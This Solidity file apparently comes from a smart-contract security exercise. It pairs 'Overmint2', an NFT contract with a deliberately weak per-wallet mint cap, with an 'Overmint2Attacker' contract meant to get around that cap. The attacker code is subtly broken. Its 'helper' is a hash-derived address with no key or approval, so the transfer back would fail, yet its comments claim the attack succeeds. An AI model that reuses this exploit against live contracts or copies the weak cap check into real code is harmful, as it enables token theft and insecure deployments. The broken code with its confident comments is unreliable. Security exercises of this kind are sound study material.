// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}


contract Overmint2Attacker {
    // Reference to target contract
    Overmint2 public target;
    
    // Track our helper address (we'll transfer NFTs here temporarily)
    address private helper;
    
    constructor(address _target) {
        target = Overmint2(_target);
        // Create a helper address from a random private key
        // We'll transfer NFTs here to bypass balanceOf check
        helper = address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp)))));
    }
    
    function attack() external {
        // Mint 5 NFTs by transferring them to helper after each mint
        for(uint i = 1; i <= 5; i++) {
            // Mint new NFT
            target.mint();
            
            // Transfer it to helper address to bypass balanceOf check
            target.transferFrom(address(this), helper, i);
        }
        
        // Now transfer all NFTs back to attacker
        for(uint i = 1; i <= 5; i++) {
            // Transfer from helper back to us
            target.transferFrom(helper, address(this), i);
        }
    }
    
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
